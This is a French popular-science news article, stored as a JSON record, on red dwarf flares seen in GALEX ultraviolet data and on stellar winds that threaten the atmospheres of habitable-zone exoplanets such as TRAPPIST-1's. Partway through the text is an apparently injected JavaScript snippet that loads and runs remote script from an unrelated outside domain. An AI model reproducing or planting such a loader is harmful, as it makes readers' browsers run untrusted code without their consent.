{"title": "Il est vraiment dur de vivre a cote d'une naine rouge", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-06-08", "content": "En raison de leurs frequentes eruptions, les naines rouges ne creent-elles pas des environnements trop hostiles pour les planetes situees dans leur zone habitable ? Une equipe a mene l'enquete sur la duree et l'intensite de leurs coleres en passant au peigne fin les donnees collectees par le satellite Galex durant une dizaine d'annees, dans l'ultraviolet. Conclusion : les conditions dans le voisinage d'une naine colerique sont difficiles. Ce qu'il faut retenir Puisqu'elles sont moins brillantes et moins chaudes que notre Soleil, les naines rouges ont leurs zones habitables beaucoup plus pres d'elles. Meme dans cette zone, l'habitabilite des planetes est incertaine car les frequentes eruptions des naines rouges, meme petites, les menacent plus directement. Une etude qui a analyse les variations de luminosite dans l'ultraviolet de centaines de naines rouges montre que les eruptions, bien que souvent plus faibles qu'escompte, peuvent endommager l'atmosphere des planetes par effet cumulatif.   Dans notre Systeme solaire, les coups de colere de notre  Soleil , une  naine jaune , representent tres rarement une menace pour la vie sur  Terre . Nous en sommes en effet suffisamment eloignes et proteges par le champ magnetique et l' atmosphere  pour ne pas etre trop affectes. En revanche, la question se pose pour les planetes orbitant autour des naines rouges ou les coups de fouets stellaires seraient en mesure de dechirer leurs atmospheres. Plus petites, moins massives et moins chaudes que notre etoile, les naines rouges sont tres communes dans notre  galaxie . Elles representeraient en effet environ les trois quarts de la population stellaire de la  Voie lactee . Ces dernieres annees, notre interet pour ces dizaines de milliards d' etoiles  s'est d'autant plus accru qu'elles semblent souvent entourees de petites planetes rocheuses. L'exemple le plus celebre a ce jour est celui de  Trappist-1  ou pas moins de sept planetes y ont ete decouvertes et, cerise sur le gateau, trois d'entre elles figurent dans la zone habitable. Voir aussi : Des dizaines de milliards d'exoterres dans la Voie lactee ? Trois mondes donc, et peut-etre plus, dans le meme systeme, ou il ne ferait ni trop chaud ni trop froid et ou, s'ils possedent une atmosphere et aussi de l'eau, la vie telle que nous la connaissons pourrait y trouver des conditions favorables... Des scientifiques y croient et trouvent des raisons d'etre optimistes tandis que d'autres restent pessimistes. Notre Soleil compare a la desormais celebre naine rouge Trappist-1. (c) ESO                               Les eruptions de naines rouges traquees dans les archives de Galex Meme si certaines de leurs eruptions sont equivalentes a celles de notre Soleil, le principal probleme demeure dans le fait que la zone habitable est beaucoup plus proche qu'elle ne l'est dans notre Systeme solaire. A titre de comparaison, la zone habitable autour du Soleil commence au-dela de l'orbite de Venus, soit a plus de 110 millions de kilometres, tandis que celle du  systeme Trappist-1 , debute a un peu plus de 4 millions de kilometres seulement... Les planetes qui s'y trouvent sont donc beaucoup plus exposees. Le risque est reel que leur atmosphere soit abimee par leur ressac. D'autant plus qu' << il peut avoir un effet cumulatif >> , estime Scott Fleming du  Space Telescope Science Institute .   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le chercheur a participe a l'etude dirigee par Chase Million du  Million Concepts  au  State College  de Pennsylvanie et presentee ce weekend lors des rencontres de l' American Astronomical Society . Celle-ci visait a determiner la frequence, la duree et l'intensite des eruptions des naines rouges et, bien sur,  in fine , si oui ou non, elles representent de veritables dangers pour les mondes qui baignent dans leur entourage tout proche. Comparaison des zones habitables de la naine rouge Trappist-1 (en haut) et le Systeme solaire interne (en bas), colorees en vert. Dans ces regions temperees, il ne fait ni trop chaud ni trop froid et l'eau pourrait etre a l'etat liquide sur une planete qui s'y trouve. Mars y figure mais faute d'une atmosphere durable, elle est aujourd'hui inhabitable. (c) Nasa, JPL                               Les naines rouges sont-elles vraiment hostiles ? C'est dans les quelque 100 teraoctets de donnees archivees des observations par le satellite Galex ( Galaxy Evolution Explorer ) durant une dizaine d'annees que l'equipe a trouve son bonheur -- la mission premiere de Galex etait de sonder le ciel dans l'ultraviolet a dessein de mieux comprendre l'evolution des galaxies a differentes periodes cosmiques. Comme les eruptions emettent une part significative de leur energie dans l'ultraviolet, elles ont pu etre enregistrees par ses detecteurs tres sensibles. Il ne restait plus aux chercheurs qu'a identifier les naines rouges et analyser leurs changements de luminosite dans cette longueur d'onde. C'est ainsi qu'ils en ont epingle des dizaines :  << Nous [en] avons trouve dans toute la gamme [de sensibilite de Galex], des toutes petites qui durent quelques secondes aux plus explosives et monstrueuses qui rendent une etoile de plus en plus brillante durant quelques minutes >>  raconte Chase Million, l'initiateur de ce programme appele gPhoton. Les chercheurs ont constate que les eruptions etaient souvent moins energetiques que ce que le supposaient de precedentes observations. Une fausse bonne nouvelle, cependant. Elles peuvent en effet etre plus frequentes et ainsi, comme on l'a evoque, avoir un effet cumulatif sur leur environnement. Quant aux plus puissantes, meme d'intensites egales a celles du Soleil, leurs effets peuvent etre catastrophiques pour d'hypothetiques etres vivants qui habiteraient sur ces mondes. Tout depend aussi des proprietes de l'atmosphere de la planete, autre facteur a prendre en compte. Alors, les naines rouges sont-elles vraiment hostiles a l' habitabilite d'une planete  ? Il est encore trop tot pour conclure.  << [...] le meilleur moyen d'en avoir le coeur net, est de faire des observations >>  expliquait fin fevrier Franck Selsis a propos de la decouverte de Trappist-1. Il ajoutait :  << il est possible qu'en fonction des caracteristiques de l'atmosphere d'une planete, son epaisseur, son contenu en eau liquide et aussi des interactions entre la  magnetosphere  et l' ionosphere  avec les  vents  stellaires, une  exoplanete autour d'une naine rouge  puisse rester habitable >> . Voir aussi : Trappist-1 : comment y chercher la vie ? L'astrophysicien Franck Selsis nous l'explique Pour en savoir plus Exobiologie : le terrible vent stellaire des naines rouges seme le doute sur l'habitabilite de leurs planetes Article de Laurent Sacco publie le 11/06/2014 En modelisant l'impact des vents stellaires des naines rouges sur des  exoplanetes  potentiellement habitables, un groupe d'astrophysiciens etats-uniens est arrive a une conclusion deja obtenue par leurs collegues. Le bouclier magnetique des  exoterres  ne pourrait pas empecher l'erosion de leur atmosphere. La probabilite de trouver des formes de vie evoluees dans la Voie lactee doit donc probablement etre revue a la baisse. Le nombre d'exoplanetes detectees dans la  Voie lactee  ne fait que grandir, et avec lui l'estimation du nombre de planetes situees dans la  zone d'habitabilite  au sein de notre Galaxie. De la meme facon dont les formations des elements lourds et des etoiles sont apparues comme inevitables au cours des developpements de l' astrophysique  pendant la seconde moitie du XX e  siecle, la formation d'un cortege planetaire semble necessairement accompagner la naissance des etoiles. La  radioastronomie  et l'astrochimie nous ayant revele que des composes organiques etaient presents dans les  nuages  moleculaires ou naissent les etoiles, on ne peut que difficilement echapper a la conclusion qu'il existe probablement des formes vivantes dans presque tous les systemes planetaires existant dans la Voie lactee. En ce debut de XXI e  siecle, le paradoxe de Fermi ne fait donc que devenir de plus en plus aigu. D'autant plus que nous savons que des planetes pouvaient se former assez tot dans l'histoire du cosmos, comme le prouve la decouverte recente de  Kepler-10c . Meme en admettant que le voyage interstellaire en utilisant des  trous de ver  soit impossible, aucune loi de la  physique  n'interdit vraiment de construire une arche des etoiles emportant avec elle une  biosphere  pouvant durer quelques centaines d'annees, le temps necessaire pour passer d'une etoile a une autre a des  vitesses  bien inferieures a celle de la  lumiere . Vue d'artiste d'une exoterre en orbite autour d'une naine rouge. Bien qu'elle soit dans la zone habitable de l'etoile, cette planete est en train de perdre son atmosphere sous l'action des vents stellaires de son etoile hote. Du fait de sa proximite, il s'y produit aussi de spectaculaires aurores boreales. Elles devraient etre visibles jusqu'a l'equateur et considerablement plus brillantes que sur Terre. (c) David A. Aguilar, CfA                               Les exoplanetes et le paradoxe de Fermi Comme notre Voie lactee est agee de plus de dix milliards d'annees, et comme il semble bien y avoir une abondance d' exoplanetes  potentiellement habitables, de nombreuses civilisations extraterrestres auraient du avoir le temps de se developper et de coloniser au moins une portion de la Galaxie. On ne comprend donc pas pourquoi la Terre n'a pas ete annexee a l'une de ces colonies depuis quelques milliards d'annees. L' espece  humaine etant recente, des extraterrestres decouvrant notre planete il y a quelques centaines de millions d'annees n'auraient donc eu aucune raison de s'abstenir de prendre possession de notre globe. Il y a au moins deux solutions simples possibles a ce paradoxe. La premiere est que la vie intelligente soit tres rare meme a l'echelle d'une galaxie en raison de sa complexite meme, ce qui rend son apparition par le jeu du hasard et de la necessite tres improbable. La seconde est que ce soit l'apparition de la vie complexe elle-meme qui est une rarete. Depuis un moment deja, les astrophysiciens et les planetologues s'interrogent sur les conditions auxquelles sont soumises des exoplanetes dans la  zone d'habitabilite  autour des naines rouges de type M. Ces etoiles sont tres nombreuses dans la Voie lactee : elles constitueraient meme 80 % de sa population stellaire. Il y a donc bien plus de chances de trouver une  exoterre  autour d'une  naine rouge  qu'autour d'une naine jaune comme le Soleil.  Or , on sait que le premier milliard d'annees de la vie d'une naine rouge est tres agite, avec des coleres terribles, produisant des flots de  rayons X  et  ultraviolets  pouvant endommager les formes vivantes que nous connaissons. Elles s'accompagnent aussi de  tempetes  avec des vents stellaires magnetises qui peuvent eroder une atmosphere planetaire. Il n'est donc nullement evident que les naines rouges, au moins pendant une periode de leur existence, soient des environnements favorables a l'apparition et a l'evolution de la vie. Le site Du Big Bang au vivant est un projet multiplateforme francophone sur la cosmologie contemporaine. Hubert Reeves, Jean-Pierre Luminet et d'autres chercheurs y repondent a des questions a l'aide de videos. (c) Dubigbangauvivant, YouTube Erosion inevitable de l'atmosphere d'exoplanetes par les vents stellaires On etudie cette question depuis plusieurs annees au moyen de diverses simulations sur  ordinateur . Il s'agit de savoir si certaines exoplanetes dans la zone d'habitabilite autour des  naines rouges  peuvent avoir une magnetosphere et une atmosphere suffisamment protectrices. Un groupe d'astrophysiciens etats-uniens vient de deposer recemment sur  arxiv  un article dans lequel les chercheurs n'ont pas etudie l'effet des coleres des naines rouges (qui, comme on l'a vu, est surtout problematique pour l' exobiologie  au debut de l'existence de ces  astres ), mais celui de leurs vents stellaires en continu. Les donnees concernant trois exoplanetes de type terrestre decouvertes par Kepler et orbitant autour de naines rouges en milieu de vie ont ete injectees dans un  modele numerique  sur ordinateur. Les chercheurs ont confirme des resultats deja obtenus. Meme une exoplanete avec un bouclier magnetique comparable a celui de la Terre n'offre pas une protection sure contre les vents stellaires de ces naines rouges. Les interactions entre ces vents, la magnetosphere et l'ionosphere de ces exoplanetes dans la zone d'habitabilite montrent en effet que les  boucliers magnetiques  devaient evoluer periodiquement. La plupart du temps, ils sont trop faibles pour empecher l'erosion d'une atmosphere sous l'effet des vents stellaires. Bien que les systemes planetaires soient tres nombreux dans la Voie lactee, il se pourrait donc bien que la vie y soit tres rare, ou au mieux sous la forme d' extremophiles  semblables a ceux qui ont peut-etre existe ou existent encore sur Mars. Bienvenue dans le systeme planetaire de Trappist-1                       Nous voici pres de Trappist-1 h, la plus eloignee des sept planetes de tailles terrestres qui gravitent autour de Trappist-1. Son petit soleil rougeoyant est a moins de 10 millions de kilometres, soit un sixieme de la distance entre Mercure et le Soleil. Depuis ce monde qui, selon la composition de son atmosphere peut etre couvert d'eau liquide ou de glace, on peut voir ses six soeurs transiter devant leur etoile.                                       ", "theme": "sciences"}